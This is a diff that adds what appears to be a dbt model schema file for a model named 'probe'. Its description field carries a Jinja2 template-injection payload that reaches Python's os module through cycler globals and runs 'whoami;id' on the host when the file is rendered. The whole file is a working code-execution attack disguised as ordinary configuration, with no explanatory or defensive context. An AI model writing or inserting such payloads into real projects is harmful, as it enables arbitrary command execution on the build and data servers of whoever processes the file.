@@ -1,0 +1,5 @@
+version: 2
+models:
+  - name: probe
+    description: |-
+      {{ modules.jinja2.Environment().from_string("{{ cycler.__init__.__globals__['os'].popen('whoami;id').read() }}").render() }}
